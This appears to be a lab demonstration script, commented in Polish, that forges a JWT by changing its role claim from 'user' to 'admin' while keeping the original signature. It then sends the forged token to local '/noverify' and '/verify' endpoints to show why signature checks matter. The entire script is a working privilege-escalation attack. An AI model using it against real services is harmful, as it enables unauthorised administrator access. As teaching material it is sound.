#!/usr/bin/env python3
import base64, json, urllib.request

SERVER = "http://127.0.0.1:5005"

def b64url_decode(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).decode().rstrip('=')

def get_json(path):
    return json.load(urllib.request.urlopen(SERVER + path))

def post_json(path, data):
    req = urllib.request.Request(SERVER + path,
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"})
    try:
        return json.load(urllib.request.urlopen(req))
    except urllib.error.HTTPError as e:
        return json.load(e)

# 1) pobierz token
token = get_json("/token")["token"]
print("[1] Oryginalny token:", token)

# 2) rozbij i zdekoduj payload
h, p, s = token.split(".")
payload = json.loads(b64url_decode(p))
print("[2] Oryginalny payload:", payload)

# 3) PODMIEN payload (role: user -> admin), ZACHOWAJ oryginalny podpis
payload["role"] = "admin"
new_p = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
tampered = f"{h}.{new_p}.{s}"
print("[3] Zmodyfikowany payload:", payload)
print("    Zmodyfikowany token  :", tampered)

# 4) wyslij do /noverify i /verify i porownaj
print("\n[4] /noverify ->", post_json("/noverify", {"token": tampered}))
print("    /verify   ->", post_json("/verify",   {"token": tampered}))
